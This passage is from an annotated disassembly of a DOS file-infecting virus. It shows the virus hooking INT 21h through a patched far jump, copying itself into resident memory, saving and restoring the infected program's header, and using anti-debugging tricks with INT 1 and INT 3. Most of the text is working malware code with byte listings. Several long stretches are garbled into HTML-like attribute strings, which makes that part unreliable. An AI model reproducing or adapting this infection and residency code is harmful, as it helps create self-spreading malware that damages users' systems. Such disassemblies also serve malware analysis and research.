	mov	word ptr ds:[49Fh],ax	;l_181F			;17DF A3 049F
	mov	di,bx						;17E2 8B FB
	mov	es,ax						;17E4 8E C0
	mov	cx,80h						;17E6 B9 0080
	mov	al,80h						;17E9 B0 80
l_17EB:	repne	scasb			;find byte 80h		;17EB F2/ AE
	cmp	cx,0						;17ED 83 F9 00
	je	l_1870			;-> not found, EXIT	;17F0 74 7E
	cmp	byte ptr es:[di],0FCh				;17F2 26: 80 3D FC
	jne	l_17EB			;-> find another place	;17F6 75 F3

					;<- get="" four="" bytes="" from="" int="" 21h="" service="" mov="" al,es:[di+2]="" ;17f8="" 26:="" 8a="" 45="" 02="" mov="" byte="" ptr="" cs:[42bh],al="" ;l_17ab="" ;17fc="" 2e:="" a2="" 042b="" mov="" al,es:[di-1]="" ;1800="" 26:="" 8a="" 45="" ff="" mov="" byte="" ptr="" cs:[428h],al="" ;l_17a8="" ;1804="" 2e:="" a2="" 0428="" mov="" al,es:[di]="" ;1808="" 26:="" 8a="" 05="" mov="" byte="" ptr="" cs:[429h],al="" ;l_17a8+1="" ;180b="" 2e:="" a2="" 0429="" mov="" al,es:[di+1]="" ;180f="" 26:="" 8a="" 45="" 01="" mov="" byte="" ptr="" cs:[42ah],al="" ;l_17a8+2="" ;1813="" 2e:="" a2="" 042a="" jmp="" short="" l_1821="" ;1817="" eb="" 08="" nop="" ;1819="" 90=""></-><- allready="" resident="" l_181a:="" jmp="" short="" l_1870="" ;-=""> EXIT		;181A EB 54
	nop							;181C 90

d_049D	dw	140Dh			;address to jump1 into	;181D 0D 14
d_049F	dw	0278h			;old int 21h segment	;181F 78 02

l_1821:	mov	ax,di						;1821 8B C7
	add	ax,4			;next to conditional jmp;1823 05 0004
	xor	bx,bx						;1826 33 DB
	mov	bl,es:[di+3]		;jump length		;1828 26: 8A 5D 03
	add	ax,bx			;jump address		;182C 03 C3
	mov	word ptr ds:[49Dh],ax	;l_181D			;182E A3 049D
	cmp	byte ptr es:[di+3],80h				;1831 26: 80 7D 03 80
	jb	l_183E			;-> forward jump	;1836 72 06
					;<- jump="" backwards="" sub="" ax,100h="" ;minus="" carry="" ;1838="" 2d="" 0100="" mov="" word="" ptr="" ds:[49dh],ax="" ;l_181d="" ;183b="" a3="" 049d="" l_183e:="" add="" di,4="" ;second="" condition="" addrs="" ;183e="" 83="" c7="" 04="" mov="" word="" ptr="" ds:[547h],di="" ;1841="" 89="" 3e="" 0547="" sub="" di,5=""></-><- area="" to="" substitute="" ;1845="" 83="" ef="" 05="" push="" es="" ;1848="" 06="" push="" di="" ;1849="" 57="" mov="" dx,9800h="" ;resident="" virus="" segment="" ;184a="" ba="" 9800="" mov="" word="" ptr="" cs:[4f5h],dx="" ;184d="" 2e:="" 89="" 16="" 04f5="" mov="" es,dx="" ;1852="" 8e="" c2="" xor="" si,si="" ;1854="" 33="" f6="" xor="" di,di="" ;1856="" 33="" ff="" mov="" cx,612h="" ;l_1380="" -=""> l_1992	;1858 B9 0612
	rep	movsb			;copy virus code	;185B F3/ A4

				;<----- take="" control="" over="" int="" 21h="" lea="" cx,cs:[413h]="" ;offset="" l_1793="" ;185d="" 8d="" 0e="" 0413="" mov="" word="" ptr="" ds:[4f3h],cx="" ;1861="" 89="" 0e="" 04f3="" pop="" di="" ;1865="" 5f="" pop="" es="" ;1866="" 07="" mov="" cx,5="" ;1867="" b9="" 0005="" lea="" si,cs:[4f2h]="" ;offset="" l_1792="" ;186a="" 8d="" 36="" 04f2="" rep="" movsb="" ;186e="" f3/="" a4="" l_1870:="" sti="" ;1870="" fb="" retn="" ;1871="" c3="" s_17bb="" endp=""></-----><---- instruction="" pattern="" to="" write="" over="" int="" 21h="" code="" d_04f2="" db="" 0eah="" ;jmp="" far="" 9800:l_1793="" ;1872="" ea="" d_04f3="" dw="" 0="" ;:="offset" l_1793="" ;1873="" 00="" 00="" d_04f5="" dw="" 9800h="" ;resident="" virus="" segment="" ;1875="" 00="" 98="" ;="===============================================" ;="" saved="" 32="" victim="" bytes="" ;------------------------------------------------="" d_04f7="" db="" 0e9h,0ffh,11h="" ;1877="" e9="" ff="" 11="" db="" 'converted',0,0,0,0="" ;187a="" 43="" 6f="" 6e="" 76="" 65="" 72="" ;1880="" 74="" 65="" 64="" 00="" 00="" 00="" 00="" db="" 'mz'="" ;1887="" 4d="" 5a="" db="" 0eah,01h,09h,00h,08h,00h="" ;1889="" ea="" 01="" 09="" 00="" 08="" 00="" db="" 20h,00h,00h,00h,0ffh,0ffh="" ;188f="" 20="" 00="" 00="" 00="" ff="" ff="" db="" 98h,00h="" ;1895="" 98="" 00="" 00="" ;-----------------------------------="" db="" 48="" dup="" (0)="" ;not="" used="" ;1897="" 0030[00]="" d_0547="" dw="" 146ch="" ;address="" to="" jump2="" into="" ;18c7="" 6c="" 14="" d_0549="" dw="" 0278h="" ;old="" int="" 21h="" segment="" ;18c9="" 78="" 02=""></----><------ code="" writed="" to="" in="" case="" of="" paragraf="" alignement="" db="" 0e9h="" ;jmp="" l_18cf="" ;18cb="" e9="" d_054c="" dw="" 052ch="" ;distance="" of="" jump="" ;18cc="" 2c="" 05="" db="" 0="" ;18ce="" 00="" ;="===============================================================" ;="" exe="" virus="" entry="" ;----------------------------------------------------------------="" l_18cf:="" push="" bx="" ;18cf="" 53="" push="" cx="" ;18d0="" 51="" push="" es="" ;18d1="" 06="" push="" ds="" ;18d2="" 1e="" pushf="" ;18d3="" 9c="" mov="" ax,cs="" ;18d4="" 8c="" c8="" mov="" ds,ax="" ;18d6="" 8e="" d8="" call="" s_1938="" ;make="" virus="" resident="" ;18d8="" e8="" 005d="" cmp="" byte="" ptr="" ds:[349h],0ffh="" ;l_16c9="" (0ffh="COM)" ;18db="" 80="" 3e="" 0349="" ff="" je="" l_18e5="" ;18e0="" 74="" 03="" jmp="" short="" l_1953="" ;-=""> ?			;18E2 EB 6F
	nop							;18E4 90

;================================================================
;	End of virus code - file *.COM
;----------------------------------------------------------------
l_18E5:	popf							;18E5 9D
	pop	ds						;18E6 1F
	pop	es						;18E7 07
	pop	cx						;18E8 59
	pop	bx						;18E9 5B
	mov	word ptr cs:[5B4h],100h	;l_1934 = victim IP	;18EA 2E: C7 06 05B4 0100
	mov	ax,es						;18F1 8C C0
	mov	word ptr cs:[5B6h],ax	;l_1936 = victim CS	;18F3 2E: A3 05B6
	call	s_16CA			;init registers		;18F7 E8 FDD0
	jmp	dword ptr cs:[5B4h]	;l_1934 -> run victim	;18FA 2E: FF 2E 05B4

					;<--- victim="" name="" d_057f="" db="" 'a:\sys.com'="" ;18ff="" 41="" 3a="" 5c="" 53="" 59="" 53="" ;1905="" 2e="" 43="" 4f="" 4d="" db="" 0,'xe',0,'e',0="" ;1909="" 00="" 58="" 45="" 00="" 45="" 00="" db="" 9="" dup="" (0)="" ;190f="" 0009[00]="" ;="===============================================================" ;="" antydebug="" -="" make="" virus="" resident="" ;----------------------------------------------------------------="" s_1918="" proc="" near="" cmp="" ax,3000h="" ;1918="" 3d="" 3000="" jne="" l_1925="" ;-=""> int 3		;191B 75 08
	call	s_17BB			;-> make virus resident	;191D E8 FE9B
	retn							;1920 C3
s_1918	endp

d_05A1	dw	 002Ah			;victim SS (rel)	;1921 2A 00
d_05A3	dw	 1388h			;victim SP		;1923 88 13

;================================================================
;	ANTYDEBUG - call int 3 (Breakpoint)
;----------------------------------------------------------------
s_1925	proc	near
l_1925:	mov	ax,3000h		;Flag register		;1925 B8 3000
	push	ax						;1928 50
l_1929:	call	dword ptr es:[0Ch]	;int 3 (Breakpoint)	;1929 26: FF 1E 000C
	cmp	ax,3000h					;192E 3D 3000
	jne	l_1929						;1931 75 F6
	retn							;1933 C3
s_1925	endp

d_05B4	dw	 0000h			;victim IP		;1934 00 00
d_05B6	dw	 000Bh			;victim CS (rel)	;1936 0B 00

;================================================================
;	Make virus resident
;----------------------------------------------------------------
s_1938	proc	near
	push	es						;1938 06
	call	s_1948			;-> INT 1 (single step)	;1939 E8 000C
	cmp	ax,0						;193C 3D 0000
	jne	l_1947						;193F 75 06
	call	s_1925			;-> INT 3 (Breakpoint)	;1941 E8 FFE1
	call	s_1918			;-> reside virus	;1944 E8 FFD1
l_1947:	pop	es						;1947 07

;================================================================
;	ANTYDEBUG - call int 1 = Single Step
;----------------------------------------------------------------
s_1948:	pushf							;1948 9C
	xor	ax,ax						;1949 33 C0
	mov	es,ax						;194B 8E C0
	call	dword ptr es:[4h]	;int 1			;194D 26: FF 1E 0004
	retn							;1952 C3
s_1938	endp

;================================================================
;	End of virus code - file *.EXE
;----------------------------------------------------------------
l_1953:	popf							;1953 9D
	pop	ds						;1954 1F
	pop	es						;1955 07
	pop	cx						;1956 59
	pop	bx						;1957 5B
	mov	ax,es						;1958 8C C0
	add	ax,10h			;relocating value	;195A 05 0010
	mov	dx,ax						;195D 8B D0
	mov	bp,word ptr cs:[5A1h]	;l_1921 = victim SS	;195F 2E: 8B 2E 05A1
	add	bp,ax						;1964 03 E8
	mov	ss,bp						;1966 8E D5
	mov	bp,word ptr cs:[5A3h]	;l_1923 = victim SP	;1968 2E: 8B 2E 05A3
	mov	sp,bp						;196D 8B E5
	mov	ax,dx						;196F 8B C2
	add	word ptr cs:[5B6h],ax	;l_1936 - CS relocation	;1971 2E: 01 06 05B6
	call	s_16CA			;init registers		;1976 E8 FD51
	jmp	dword ptr cs:[5B4h]	;-> run victim		;1979 2E: FF 2E 05B4

	db	20 dup (0)		;COM file stack		;197E 0014[00]

d_0612	label	byte						;1992h

seg_a	ends

	end	start

</---></------></-></-></-></----></--></-></--->